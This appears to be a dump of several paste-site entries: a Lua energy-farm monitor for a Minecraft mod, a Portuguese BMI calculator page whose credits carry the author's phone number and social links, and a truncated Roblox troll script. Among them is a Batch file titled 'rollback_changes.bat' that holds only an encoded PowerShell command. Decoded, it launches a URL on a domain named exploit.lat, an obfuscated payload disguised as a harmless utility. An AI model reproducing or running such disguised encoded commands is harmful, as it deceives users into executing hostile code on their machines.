            print(""Modem message received on channel "" .. channel .. "" (listening on "" .. WIRELESS_CHANNEL .. "")"")
            if channel == WIRELESS_CHANNEL then
                handleMessage(message)
            end
        elseif event == ""timer"" then
            -- Periodic update to refresh connection status
            updateDisplay()
        end
        
        -- Set a timer for periodic updates
        os.startTimer(5)
    end
end

-- Error handling wrapper
local function runWithErrorHandling()
    local success, error = pcall(main)
    if not success then
        monitor.setBackgroundColor(colors.black)
        monitor.clear()
        monitor.setCursorPos(1, 1)
        monitor.setTextColor(colors.red)
        monitor.write(""ERROR: "" .. tostring(error))
        print(""Error occurred: "" .. tostring(error))
        print(""Restarting in 5 seconds..."")
        sleep(5)
        runWithErrorHandling()
    end
end

-- Start the program
runWithErrorHandling() "
8Z9qR3e1,energy_farm_monitor,DanFrmSpace,Lua,Saturday 7th of June 2025 05:46:23 PM CDT,"-- Energy Farm Data Collection Script
-- Collects data from solar panels and energy cubes, transmits to remote monitor

local WIRELESS_CHANNEL = 100
local UPDATE_INTERVAL = 5 -- seconds
local COMPUTER_ID = ""computer_1""

-- Initialize wireless modem
local wirelessModem = peripheral.wrap(""left"")
if not wirelessModem then
    error(""No wireless modem found on left of computer"")
end
wirelessModem.open(WIRELESS_CHANNEL)

-- Function to safely get peripheral data
local function safeGetData(peripheral, method, default)
    local success, result = pcall(function()
        return peripheral[method]()
    end)
    return success and result or default
end

-- Function to collect solar panel data
local function collectSolarData()
    local solarData = {}
    
    for i = 0, 9 do
        local panelName = ""advancedSolarGenerator_"" .. i
        local panel = peripheral.wrap(panelName)
        
        if panel then
            solarData[panelName] = {
                energy = safeGetData(panel, ""getEnergy"", 0),
                maxEnergy = safeGetData(panel, ""getMaxEnergy"", 0),
                energyPercentage = safeGetData(panel, ""getEnergyFilledPercentage"", 0),
                productionRate = safeGetData(panel, ""getProductionRate"", 0),
                maxOutput = safeGetData(panel, ""getMaxOutput"", 0),
                canSeeSun = safeGetData(panel, ""canSeeSun"", false),
                energyNeeded = safeGetData(panel, ""getEnergyNeeded"", 0),
                comparatorLevel = safeGetData(panel, ""getComparatorLevel"", 0)
            }
        else
            print(""Warning: Solar panel "" .. panelName .. "" not found"")
        end
    end
    
    return solarData
end

-- Function to collect energy cube data
local function collectEnergyCubeData()
    local cubeData = {}
    
    for i = 0, 5 do
        local cubeName = ""advancedEnergyCube_"" .. i
        local cube = peripheral.wrap(cubeName)
        
        if cube then
            cubeData[cubeName] = {
                energy = safeGetData(cube, ""getEnergy"", 0),
                maxEnergy = safeGetData(cube, ""getMaxEnergy"", 0),
                energyPercentage = safeGetData(cube, ""getEnergyFilledPercentage"", 0),
                isEjecting = safeGetData(cube, ""isEjecting"", false),
                mode = safeGetData(cube, ""getMode"", ""Unknown""),
                inputColor = safeGetData(cube, ""getInputColor"", ""None""),
                outputColor = safeGetData(cube, ""getOutputColor"", ""None""),
                comparatorLevel = safeGetData(cube, ""getComparatorLevel"", 0),
                canEject = safeGetData(cube, ""canEject"", false),
                hasStrictInput = safeGetData(cube, ""hasStrictInput"", false)
            }
        else
            print(""Warning: Energy cube "" .. cubeName .. "" not found"")
        end
    end
    
    return cubeData
end

-- Function to calculate totals and statistics
local function calculateStats(solarData, cubeData)
    local stats = {
        solar = {
            totalEnergy = 0,
            totalMaxEnergy = 0,
            totalProductionRate = 0,
            averagePercentage = 0,
            panelsSeeSun = 0,
            totalPanels = 0
        },
        cubes = {
            totalEnergy = 0,
            totalMaxEnergy = 0,
            averagePercentage = 0,
            ejectingCubes = 0,
            totalCubes = 0
        },
        system = {
            totalSystemEnergy = 0,
            totalSystemCapacity = 0,
            systemPercentage = 0
        }
    }
    
    -- Calculate solar stats
    for name, data in pairs(solarData) do
        stats.solar.totalEnergy = stats.solar.totalEnergy + data.energy
        stats.solar.totalMaxEnergy = stats.solar.totalMaxEnergy + data.maxEnergy
        stats.solar.totalProductionRate = stats.solar.totalProductionRate + data.productionRate
        stats.solar.averagePercentage = stats.solar.averagePercentage + data.energyPercentage
        if data.canSeeSun then
            stats.solar.panelsSeeSun = stats.solar.panelsSeeSun + 1
        end
        stats.solar.totalPanels = stats.solar.totalPanels + 1
    end
    
    if stats.solar.totalPanels > 0 then
        stats.solar.averagePercentage = stats.solar.averagePercentage / stats.solar.totalPanels
    end
    
    -- Calculate cube stats
    for name, data in pairs(cubeData) do
        stats.cubes.totalEnergy = stats.cubes.totalEnergy + data.energy
        stats.cubes.totalMaxEnergy = stats.cubes.totalMaxEnergy + data.maxEnergy
        stats.cubes.averagePercentage = stats.cubes.averagePercentage + data.energyPercentage
        if data.isEjecting then
            stats.cubes.ejectingCubes = stats.cubes.ejectingCubes + 1
        end
        stats.cubes.totalCubes = stats.cubes.totalCubes + 1
    end
    
    if stats.cubes.totalCubes > 0 then
        stats.cubes.averagePercentage = stats.cubes.averagePercentage / stats.cubes.totalCubes
    end
    
    -- Calculate system totals
    stats.system.totalSystemEnergy = stats.solar.totalEnergy + stats.cubes.totalEnergy
    stats.system.totalSystemCapacity = stats.solar.totalMaxEnergy + stats.cubes.totalMaxEnergy
    if stats.system.totalSystemCapacity > 0 then
        stats.system.systemPercentage = (stats.system.totalSystemEnergy / stats.system.totalSystemCapacity) * 100
    end
    
    return stats
end

-- Function to format energy values for display
local function formatEnergy(energy)
    if energy >= 1000000000 then
        return string.format(""%.2fGFE"", energy / 1000000000)
    elseif energy >= 1000000 then
        return string.format(""%.2fMFE"", energy / 1000000)
    elseif energy >= 1000 then
        return string.format(""%.2fkFE"", energy / 1000)
    else
        return string.format(""%.0fFE"", energy)
    end
end

-- Function to transmit data
local function transmitData(data)
    local message = {
        timestamp = os.epoch(""utc""),
        source = COMPUTER_ID,
        data = data
    }
    
    wirelessModem.transmit(WIRELESS_CHANNEL, WIRELESS_CHANNEL, message)
    print(""Data transmitted on channel "" .. WIRELESS_CHANNEL)
end

-- Function to display local status
local function displayLocalStatus(stats)
    term.clear()
    term.setCursorPos(1, 1)
    
    print(""=== ENERGY FARM MONITOR ==="")
    print(""Time: "" .. textutils.formatTime(os.time(), true))
    print("""")
    
    print(""SOLAR PANELS:"")
    print(""  Total Energy: "" .. formatEnergy(stats.solar.totalEnergy))
    print(""  Capacity: "" .. formatEnergy(stats.solar.totalMaxEnergy))
    print(""  Production: "" .. formatEnergy(stats.solar.totalProductionRate) .. ""/t"")
    print(""  Average Fill: "" .. string.format(""%.1f%%"", stats.solar.averagePercentage))
    print(""  Sun Visible: "" .. stats.solar.panelsSeeSun .. ""/"" .. stats.solar.totalPanels)
    print("""")
    
    print(""ENERGY CUBES:"")
    print(""  Total Energy: "" .. formatEnergy(stats.cubes.totalEnergy))
    print(""  Capacity: "" .. formatEnergy(stats.cubes.totalMaxEnergy))
    print(""  Average Fill: "" .. string.format(""%.1f%%"", stats.cubes.averagePercentage))
    print(""  Ejecting: "" .. stats.cubes.ejectingCubes .. ""/"" .. stats.cubes.totalCubes)
    print("""")
    
    print(""SYSTEM TOTAL:"")
    print(""  Energy: "" .. formatEnergy(stats.system.totalSystemEnergy))
    print(""  Capacity: "" .. formatEnergy(stats.system.totalSystemCapacity))
    print(""  Fill Level: "" .. string.format(""%.1f%%"", stats.system.systemPercentage))
    print("""")
    
    print(""Next update in "" .. UPDATE_INTERVAL .. "" seconds..."")
end

-- Main monitoring loop
local function main()
    print(""Starting Energy Farm Monitor..."")
    print(""Wireless channel: "" .. WIRELESS_CHANNEL)
    print(""Update interval: "" .. UPDATE_INTERVAL .. "" seconds"")
    print("""")
    
    while true do
        local solarData = collectSolarData()
        local cubeData = collectEnergyCubeData()
        local stats = calculateStats(solarData, cubeData)
        
        local fullData = {
            solar = solarData,
            cubes = cubeData,
            stats = stats
        }
        
        transmitData(fullData)
        displayLocalStatus(stats)
        
        sleep(UPDATE_INTERVAL)
    end
end

-- Error handling wrapper
local function runWithErrorHandling()
    local success, error = pcall(main)
    if not success then
        print(""Error occurred: "" .. tostring(error))
        print(""Restarting in 5 seconds..."")
        sleep(5)
        runWithErrorHandling()
    end
end

-- Start the program
runWithErrorHandling() "
yqV7nmRF,Calculador de IMC,Claudio51,HTML,Saturday 7th of June 2025 05:15:57 PM CDT,"
<!DOCTYPE html><!-- by claudioadventista@hotmail.com -->
<html lang=""pt-br"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Calculadora de IMC</title>
    <style>
        body{
            background-color:#e3e4e0;
        }
        .tab{
            font-family: 'Trebuchet MS', sans-serif;
            background-color:#fff;
            width: 300px;
            margin: 5px auto;
            border: 1px solid #ccc;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 5px 20px 15px 20px;
        }
        #tabela{
            display:none;
        }
        #tabCredito{
            display:none;
        }
        #historico{
            display: none;
        }
        #tabHistorico{
            width:86%;
            height:219px;
            background-color:#eee7be;
            border:1px solid #ccc;
            padding:20px;
            overflow: auto;
            margin-bottom: 4px;
            font-size: 0.8em;
        }
        label{
            display: block;
            margin-bottom: 10px;
            text-align: center;
        }
        input[type=""text""]{
            width: 84%;
            height: 25px;
            margin-bottom: 10px;
            right: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            float:left;
        }
        table,td{
            border-color: #fff;
            padding:0;
        }
        table{
            width: 100%;
        }
        td{
            width: 50%;   
        }
        .botao{
            color: #fff;
            height:35px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width:48%;
            padding:0;
            margin-top:2px;
        }
        #calcular{
            background-color: #4caf50;
            border:1px solid #3e8341;
            width: 100%;
        }
        #calcular:hover{
            background-color:  #3e8341;
        }
        .novoCadastro{
            background-color: #755;
            border:1px solid #000;  
        }
        .novoCadastro:hover{
            background-color:  rgb(85, 61, 61);
        }
        .botaoInferior{
            background-color: #3e84ee;
            border:1px solid #2220b6;  
        }
        .botaoInferior:hover{
            background-color: #2220b6;
        }
        .fechar{
            background-color: #f13131;
            float:right;
            border:1px solid #991b0a;
        }
        .fechar:hover{
            background-color:  #991b0a;
        }
        #resultado{
            margin-top: 10px;
            font-size: 18px;
            font-weight: bold;
            background-color: #d5dee6; 
            border:1px solid #7db2e0; 
            border-radius: 5px;
            padding: 15px 0px 15px 0px;
            display: none;
        }
        h2, h1{
            background-color: #eee; 
        }
        .magrezaGrauIII, .obesidadeGrauII{ 
           background-color:#ccc; 
           border:1px solid #aaa;
        }
        .magrezaGrauII,.obesidadeGrauI{ 
           background-color:#ddd; 
           border:1px solid #bbb;
        }
        .magrezaGrauI,.sobrepeso{ 
           background-color:#eee;
           border:1px solid #ccc; 
        }
        .normal{
           border:1px solid #ddd;
        }    
        .obesidadeGrauIII{
          background-color:#bbb; 
          border:1px solid #999;
        }
        .tabelaIMC{
            padding:5px;
            border-radius: 5px;
            margin: 5px 0 5px 0;
        }
        .labelPeso, .labelAltura{
            color:#ad0303;
        }
        .imagem{
            position:relative;
            float:left;
            margin-top:-60px; 
        }
        img{
            width:70px;
            height:50px;   
            background-color: #eee;
            border:none;  
        }
        a{
            text-decoration: none;
            color:#000;
        }
        .tabelaCredito{
            width: 98%;
            border-radius: 5px;
            padding:5px 0 5px 5px;
            margin:5px 0;
        }
        .link{
            background-color: #eee; 
            border:1px solid #ccc;    
        }
    </style>
</head>
<body>
    <div id=""formulario"" class=""tab"">
        <center><h1>Calculadora de IMC</h1></center>
        <center><h2>Cl&aacuteudio Brito</h2></center>
        <div id=""imagem"" style=""display:none;"" > 
            <a href=""https://youtu.be/mDaa9ty23e8"" target=""_blank""><img class=""imagem"" src=""https://i.pinimg.com/564x/c9/ae/14/c9ae1482ccf3b4503d6c9fff41b999f1.jpg"" /></a>
        </div>
        <table>
            <tr>
                <td>
                    <label for=""peso"" class=""labelPeso"">Peso max. 250</label>
                    <input type=""text"" id=""peso"" placeholder=""Digite aqui o peso"" maxlength=""4"" inputmode=""numeric"" required 
                    oninput=""validaPeso(this.value)"" 
                    onclick=""limpaResultado();this.value = '';"">
                </td>
                <td>
                    <label for=""altura"" class=""labelAltura"">Altura max. 2,99</label>
                    <input type=""text"" id=""altura"" placeholder=""Digite aqui a altura"" inputmode=""numeric"" maxlength=""4"" required 
                        oninput=""validaAltura(this.value);"" 
                        onkeyup=""alturaMaxima(this.value);""
                        onclick=""limpaResultado();this.value = '';"" >
                </td>
            </tr>
            <tr>
                <td>
                    <label for=""nome"">Nome</label>
                    <input type=""text"" id=""nome"" maxlength=""50"" placeholder=""Digite aqui o nome"" 
                        oninput=""formataNome(this.value)""
                        onclick=""this.value = '';"">
                </td>
                <td>
                    <label for=""idade"">Idade max. 130</label>
                    <input type=""text"" id=""idade"" max=""3"" inputmode=""numeric"" maxlength=""3"" placeholder=""Digite aqui a idade"" 
                        oninput=""validaIdade(this.value)""
                        onkeyup=""idadeMaxima(this.value)"" 
                        onclick=""this.value = '';"" > 
                </td>
            </tr>
            <tr>
                <td colspan=""2"">
                    <button id=""calcular"" class=""botao"" >Calcular IMC</button> 
                </td>
            </tr>
        </table>
        <table>
            <tr>
                <td>
                    <button  class=""botao novoCadastro"" onclick=""limpaConsulta()"" >Limpar</button>
                    <button class=""botao botaoInferior"" onclick=""mostraHistorico()"">Hist&oacuterico</button>
                </td>
                <td>
                    <button class=""botao botaoInferior"" onclick=""tabCredito()"">Cr&eacuteditos</button>
                    <button class=""botao botaoInferior"" onclick=""mostrar()"">Tabela</button>
                </td>
            </tr>
        </table>
        <center><div id=""resultado""></div></center>
    </div>
    <div id=""tabela"" class=""tab"">
        <center><h1>Tabela de IMC</h1></center>      
        <p class=""tabelaIMC obesidadeGrauIII"">Acima de 40 Obesidade grau III</p>
        <p class=""tabelaIMC obesidadeGrauII"">Entre 35 e 40 Obesidade grau II</p>
        <p class=""tabelaIMC obesidadeGrauI"">Entre 30 e 34,9 Obesidade grau I</p>
        <p class=""tabelaIMC sobrepeso"">Entre 25 e 29,9 Sobrepeso</p>
        <p class=""tabelaIMC normal"">Entre 18,5 e 24,9 Normal</p>
        <p class=""tabelaIMC magrezaGrauI"">Entre 17 e 18.4 Magreza grau I</p>
        <p class=""tabelaIMC magrezaGrauII"">Entre 16 e 16,9 Magreza grau II</p>
        <p class=""tabelaIMC magrezaGrauIII"">Abaixo de 15,9 Magreza grau III</p>     
        <table>
            <tr>
                <td></td>
                <td>
                    <button class=""botao fechar"" onclick=""fechar()"">Fechar</button>
                </td>
            </tr>
        </table>
    </div>
    <div id=""tabCredito"" class=""tab"">
        <center><h1>Cr&eacuteditos</h1></center>
        <p class=""tabelaCredito"">Criado em maio/2025 por Cl&aacuteudio Brito</p>
        <p class=""tabelaCredito"">Contato - Whatsapp (81) 9 9924-6724</p>
        <p class=""tabelaCredito"">Clique abaixo, e siga-me redes sociais</p>
        <p class=""tabelaCredito link""><a href=""https://threads.net/@xavier.brito"" target=""_blank"">Threads - Xavier Brito</a></p>
        <p class=""tabelaCredito link""><a href=""https://www.instagram.com/xavier.brito/"" target=""_blank"">Instagram - Xavier Brito</a></p>
        <p class=""tabelaCredito link""></a><a href=""https://m.facebook.com/claudio.xavier.37669/"" target=""_blank"">Facebook - Cl&aacuteudio Brito</a></p>
        <p class=""tabelaCredito link""><a href=""https://youtube.com/@cteclaudiobritocaruaru-pe9889?si=JanZY_EJXQixKK3C"" target=""_blank"">Youtube - CTE Cl&aacuteudio Brito</a></p>
        <p class=""tabelaCredito link""><a href=""https://www.instagram.com/oficina.c.t.eletronica/"" target=""_blank"">Instagram - Oficina C.T.Eletr&ocircnica</a></p>   
        <table>
            <tr>
                <td></td>
                <td>
                    <button class=""botao fechar"" onclick=""fechar()"">Fechar</button>
                </td>
            </tr>
        </table>
    </div>
    <div id=""historico""class=""tab"">
        <center><h1>Hist&oacuterico</h1></center>
        <div id=""tabHistorico""></div>
        <table>
            <tr>
                <td>
                    <button class=""botao novoCadastro"" onclick=""limparHistorico()"" >Limpar </button>                
                    <button class=""botao botaoInferior"" onclick=""salvarDados()"" >Salvar </button>
                </td>
                <td>
                    <button class=""botao fechar"" onclick=""fechar()"">Fechar</button>
                </td>
            </tr>
        </table>
    </div>
    <script>
        const botaoCalcular = document.getElementById(""calcular"");
        const resultado = document.getElementById(""resultado"");
        function limpaResultado(){
            document.getElementById('resultado').innerText = '';
            document.getElementById('resultado').style.display='none';
        }      
        /******************************************************************* /
        /                                                                    /
        /                                                                    /
        /     CAMPO PESO                                                     /
        /                                                                    /
        /                                                                    /
        /********************************************************************/
        function validaPeso(peso){// oninput
            let inputPeso = document.getElementById('peso');
            document.getElementById('peso').value = peso.replace(/[^0-9,]/g,'').replace(/(\..*?)\..*/g,'$1');
            if(peso>250){
                document.getElementById('peso').value = '';
            };
            if(peso.substr(0) === '0' || peso.substr(0) === ','){
                document.getElementById(""peso"").value = '';
            };
            if(peso.substr(3,1) === ','){
                inputPeso.maxLength = 5;    
            }else{
                inputPeso.maxLength = 4;
            };
            inputPeso.addEventListener('input', function(event){
                let v =  this.value;
                let m = v.match(/,/g);
                if(m && m.length >1){
                    this.value = v.substring(0, v.indexOf(',')+1)
                    + v.substring(v.indexOf(',')+1).replace(/,/g,'');
                }
            });
        }; 
        /******************************************************************* /
        /                                                                    /
        /                                                                    /
        /     CAMPO ALTURA                                                   /
        /                                                                    /
        /                                                                    /
        /********************************************************************/
        function alturaMaxima(alt){// onkeyup
            if(alt.startsWith(3) || alt.startsWith(4) || alt.startsWith(5) || alt.startsWith(6) || alt.startsWith(7) || alt.startsWith(8) || alt.startsWith(9)){
                document.getElementById(""altura"").value = ''; 
            }
             if(alt.startsWith('0')){
                document.getElementById(""altura"").value = '0,'+ alt.substr(2);
            }
        }
        const zero = document.getElementById('altura');
        zero.addEventListener('keydown',(e)=>{
            const valor = zero.value;
            const ehZero = e.key === '0';
            if (valor.length === 2 && ehZero){
                e.preventDefault();
            }
        }) 
        function validaAltura(altura){// oninput
            altura = altura.replace(/[^0-9]/g,'').replace(/(\..*?)\..*/g,'$1');
            altura = altura.replace(/\B(?=(\d{1})+(?!\d))/g, "","");
            document.getElementById(""altura"").value = altura;
            let inputAltura = document.getElementById('altura');
            inputAltura.addEventListener('input', function(event){
                let v =  this.value;
                let m = v.match(/,/g);
                if(m && m.length >1){
                    this.value = v.substring(0, v.indexOf(',')+1)
                    + v.substring(v.indexOf(',')+1).replace(/,/g,'');
                }
            });
        }
        /******************************************************************* /
        /                                                                    /
        /                                                                    /
        /     CAMPO NOME                                                     /
        /                                                                    /
        /                                                                    /
        /********************************************************************/
        function formataNome(nome){// oninput
            nome = nome.replace(/[^a-zA-Z ]/g,'');
            nome = nome.toUpperCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/\s+/g, ' ');
            document.getElementById('nome').value = nome;
            if(nome.startsWith(' ')){
                document.getElementById('nome').value = '';
            }; 
        } 
        /******************************************************************* /
        /                                                                    /
        /                                                                    /
        /     CAMPO IDADE                                                    /
        /                                                                    /
        /                                                                    /
        /********************************************************************/
        function idadeMaxima(old){// onkeyup
            if(old.startsWith('0')){
                    document.getElementById(""idade"").value = '0,'+ old.substr(2);
            } 
        }       
        const zeroIdade = document.getElementById('idade');
        zeroIdade.addEventListener('keydown',(e)=>{  
            const valorIdade = zeroIdade.value;
            const ehZeroIdade = e.key === '0';
            if (valorIdade.startsWith('0') && valorIdade.length === 2 && ehZeroIdade){
                e.preventDefault();
            }
        });
        function validaIdade(idade){// oninput
            if(idade.startsWith('0')){
                idade = idade.replace(/[^0-9,]/g,'').replace(/(\..*?)\..*/g,'$1');
            }else{
                idade = idade.replace(/[^0-9]/g,'').replace(/(\..*?)\..*/g,'$1');
            }
            document.getElementById(""idade"").value = idade;
            if(idade>130){
                document.getElementById('idade').value = '';
            };
            let inputIdade = document.getElementById('idade');
            inputIdade.addEventListener('input', function(event){
                let v =  this.value;
                let m = v.match(/,/g);
                if(m && m.length >1){
                    this.value = v.substring(0, v.indexOf(',')+1)
                    + v.substring(v.indexOf(',')+1).replace(/,/g,'');
                }
            });
        }        
        /******************************************************************* /
        /                                                                    /
        /                                                                    /
        /    INICIO DO PROCESSO DO CALCULAR O IMC E SALVAR AS INFORMACOES    /
        /                                                                    /
        /                                                                    /
        /*** funcao que calcula o IMC calculando o peso e a altura  *********/
        botaoCalcular.addEventListener(""click"", (e) =>{
            e.preventDefault();
            const peso2 = document.getElementById(""peso"");
            const altura2 = document.getElementById(""altura"");
            const nome = document.getElementById(""nome"").value;
            const idade = document.getElementById(""idade"").value;
            // pega a data atual numa variavel
            let dataAtual = new Date().toLocaleString();
            // array que vai coletar as informacoes salvas e as novas
            let arrayHistorico = [];
            if(peso2.value < 2){
                alert(""Peso m\u00ednimo 2 que \u00e9 o mesmo que 2 kg"");
                return false;
            }
            if(altura2.value.startsWith('0')){
                if(altura2.value.substr(0) === '0,' || altura2.value.substr(2,1) === '1' || altura2.value.substr(2,1) === '2' || altura2.value.substr(2,1) === '3'){
                    alert(""Altura m\u00ednima e 0,4 que \u00e9 o mesmo que 40 cm"");
                    return false;
                }
            }
            if(nome !== '' && nome.length < 2){
                alert(""Nome precisa ter pelo menos dois caracteres"");
                return false;
            }
            if(idade !== ''){
                if(idade.substr(0) === '0,'){
                    alert(""Idade inv\u00e1lida"");
                    return false;
                }  
            }
            // se houver valor nos campos peso e altura, entra aqui 
            if(peso2.value !== '' && altura2.value !== ''){              
                //  permite um valor flutuante no campo peso e troca a virgula pelo ponto
                const peso = parseFloat(document.getElementById(""peso"").value.replace("","","".""));             
                //  permite um valor flutuante no campo altura e troca a virgula pelo ponto
                const altura = parseFloat(document.getElementById(""altura"").value.replace("","","".""));                
                // caucula o IMC 
                const imc = peso / (altura * altura);                
                // se o campo peso e altura estiverem preenchidos, mostra o resultado, segunda validacao
                if(peso2.value.length>=1 && altura2.value.length>=1){
                    // mostra a div do resultado
                    document.getElementById(""resultado"").style.display=""block"";
                    // puxa a classificacao de acordo com o resultado do imc
                    const classificacao = classificarIMC(imc);
                    // mostra o resultado na div com virgula ao inves de ponto
                    resultado.innerText = `IMC: ${imc.toFixed(2).replace(""."","","")} - ${classificacao}`;
                    // busca encontrar o local expecifico onde vai salvar as informacoes
                    if(localStorage.myHistory){
                        // caso o local exista, pega as informacoes contida e coloca no array que foi criado
                        arrayHistorico = JSON.parse(localStorage.getItem('myHistory'));
                    };
                    // com as informacoes coletadas do local storage, agora acrescenta as informacoes dos campos no array
                    arrayHistorico.push('<center style=""color:brown;background-color:white;padding:5px 5px 5px 5px; border-radius:5px;"">--- NOVO HIST&OacuteRICO ---</center>');
                    arrayHistorico.push('Nome : ' + nome);
                    arrayHistorico.push('Idade : ' + idade);
                    arrayHistorico.push('Peso : ' + peso.toFixed(1).replace(""."","",""));
                    arrayHistorico.push('Altura : ' + altura.toFixed(2).replace(""."","",""));
                    // mostra apenas as duas casas decimais do resultado
                    arrayHistorico.push('IMC : ' + imc.toFixed(2).replace(""."","",""));
                    arrayHistorico.push(classificacao);
                    arrayHistorico.push('Data : ' + dataAtual) ;
                    // salva tudo como uma unica informacao, substituindo as informacoes antigas no local especifico
                    localStorage.myHistory = JSON.stringify(arrayHistorico); 
                }else{
                // se o campo peso ou altura estiverem em branco   
                    alert(""Campo em vermelho, em branco""); 
                }
            }else{
                alert(""Campo em vermelho, em branco"");
            }
        });
        /************************************************************************** /
        /                                                                           /
        /                                                                           /
        /     ***** INICIO DO PROCESSO DE CLASSIFICACAO DO RESULTADO DO IMC *****   /
        /                                                                           /
        /                                                                           /                                                          
        /*** funcao que classifica o estado de saude de acordo com o IMC encontrado */
        function classificarIMC(imc){
            if(imc < 16){
                return ""Magreza grau III"";
            }else if(imc >= 16 && imc < 17){
                return ""Magreza grau II"";
            }else if(imc >=17 && imc < 18.5){
                return ""Magreza grau I"";
            }else if(imc >= 18.5 && imc < 25){
                return ""Normal"";
            }else if(imc >= 25 && imc < 30){
                return ""Sobrepeso"";
            }else if(imc >= 30 && imc < 35){
                return ""Obesidade Gral I"";
            }else if(imc >= 35 && imc < 40){
                return ""Obesidade Gral II"";
            }else{
                return ""Obesidade Gral III"";
            } 
        }
        /************************************************************************** /
        /                                                                           /
        /                                                                           /
        /    ************ INICIO DA FUNCAO DE LIMPAR A ACONSULTA ****************   /
        /                                                                           /
        /                                                                           /
        /*** funcao que limpa a consulta nos campos ********************************/ 
        function limpaConsulta(){
            if(confirm (""Deseja limpar tudo?"")){
                // seleciona todos os campos input
                const inputs = document.querySelectorAll('input');
                // faz uma varredura em todos os inputs
                inputs.forEach(input => {
                    // atribui o valor branco para cada um deles
                    input.value = '';
                })
                // chama a funcao que limpa o resultado
                limpaResultado();
            }else{
                 // se nao for confirmada, retorna sem limpar os campos
                return false;
            }
        }
        /************************************************************************** /
        /                                                                           /
        /                                                                           /
        /     ************** INICIO DA FUNCAO MOSTRAR HISTORICO ****************    /
        /                                                                           /
        /                                                                           /
        /*** funcao que mostra o historico *****************************************/ 
        function mostraHistorico(){
        document.getElementById(""formulario"").style.display=""none"";
        document.getElementById(""historico"").style.display=""block"";
            // se houver informacao no local especifico do local storage, entra aqui
            if(localStorage.myHistory !==''){
                // cria uma variavel para mostrar o conteudo do local storage numa div
                let resultDIV = document.getElementById('tabHistorico');
                // se houver um local especifico no local storage, coleta as informacoes, segunda validacao
                if(localStorage.myHistory){
                    // apaga as informacoes na div onde vai mostrar as informacoes atualizadas
                    resultDIV.innerHTML = """";    
                    // pega as informacoes do local storage e coloca no array
                    arrayHistorico = JSON.parse(localStorage.getItem('myHistory'));   
                    // com um loop for, cria uma lista e coloca na variavel que vai mostrar as informacoes na div 
                    for(let i in arrayHistorico){
                        let p = document.createElement(""p"");
                        p.innerHTML = arrayHistorico[i];
                        resultDIV.append(p);
                    }  
                } 
            }else{
                // se nao houver informacao, mostra a mensgem
                alert('Nenhuma informa\u00e7\u00e3o gravada');
                // chama a funcao fechar 
                fechar();
            }           
        };
        /************************************************************************** /
        /                                                                           /
        /                                                                           /
        /     ************** INICIO DA FUNCAO LIMPAR HISTORICO *****************    /
        /                                                                           /
        /                                                                           /
        /*** limpa o historico no local storage ************************************/ 
        function limparHistorico(){
            if(confirm (""Deseja limpar o hist\u00f3rico?"")){
            // se for confirmada, apaga todas as informacoes no local especifico no local storage
            localStorage.myHistory = """";
            // refresh na pagina
            location.reload();
            }else{
                // se nao for confirmada, retorna sem apagar o historico
                return false;
            }
        }
        /************************************************************************** /
        /                                                                           /
        /                                                                           /
        /     ***************** INICIO DAS FUNCOES MENORES *********************    /
        /                                                                           /
        /                                                                           /
        /*** funcao do botao mostrar tabela  ***************************************/ 
         function mostrar(){
            document.getElementById(""tabela"").style.display=""block"";
            document.getElementById(""formulario"").style.display=""none""; 
        }
        // funcao do botao mostrar credito
        function tabCredito(){
            document.getElementById(""tabCredito"").style.display=""block"";
            document.getElementById(""formulario"").style.display=""none"";
        }
        // funcao do botao mostrar historico
        function mostrarHistorico(){
            document.getElementById(""formulario"").style.display=""none"";
            document.getElementById(""historico"").style.display=""block"";
        }
        // funcao do botao fechar
        function fechar(){
            document.getElementById(""tabela"").style.display=""none"";
            document.getElementById(""tabCredito"").style.display=""none"";
            document.getElementById(""historico"").style.display=""none"";
            document.getElementById(""formulario"").style.display=""block"";  
        }
        /************************************************************************** /
        /                                                                           /
        /                                                                           /
        /     ******* INICIO DO PROCEDIMENTO PARA MOSTRAR A IMAGEM *************    /
        /                                                                           /
        /                                                                           /
        /*** busca a imagem na internet ********************************************/ 
        let image = document.createElement('img');
        image.src=""https://i.pinimg.com/564x/c9/ae/14/c9ae1482ccf3b4503d6c9fff41b999f1.jpg"";
        // mostra a div da imagem se estiver conectado a internet
        image.onload = function(){
            document.getElementById(""imagem"").style.display = ""block"";
        }
        // esconde a div da imagem se nao estiver conectado a internet
        image.onerror = function(){
            document.getElementById(""imagem"").style.display = ""none"";
        }
        /******************************************************************* /
        /                                                                    /
        /                                                                    /
        /     SALVAR DADOS EM ARQUIVO TXT                                    /
        /                                                                    /
        /                                                                    /
        /********************************************************************/
        function salvarDados(){
            if(confirm (""Deseja salvar o hist\u00f3rico em arquivo de texto?"")){
                const dados = localStorage.getItem('myHistory');
                const blob = new Blob([dados],{type: 'text/plain'});
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'dados_imc.txt';
                link.click();
            }else{
                return false;
            } 
        }
    </script>
</body>
</html>"
iY3WbvBw,rollback_changes.bat,elsapito,Batch,Saturday 7th of June 2025 04:54:32 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYwAzADcAMAA0ADgAMABhAA==

igQoid"
xB6EtFZe,Untitled,davinoazhari_26,Lua,Saturday 7th of June 2025 04:53:07 PM CDT,"
local randomText = {
	""YOU CAN DO NOTHING!"",
	""EXECUTOR DISSABLED"",
	""FUC YOU"",
	""CHAOS COMING""
}
local function createGuiForPlayer(player)
	local ScreenGui = Instance.new(""ScreenGui"")
	ScreenGui.Name = ""RoundGui"" -- Give it a unique name for filtering
	local TextLabel = Instance.new(""TextLabel"")

	ScreenGui.Parent = player:WaitForChild(""PlayerGui"")
	TextLabel.Parent = ScreenGui

	TextLabel.Size = UDim2.new(0, 300, 0, 100)
	TextLabel.Position = UDim2.new(0.5, -150, 0.2, 0)
	TextLabel.BackgroundTransparency = 0.5
	TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.TextSize = 30
	TextLabel.Text = ""YOU CAN DO NOTHING EXECUTOR DISSABLED""
	TextLabel.TextScaled = true
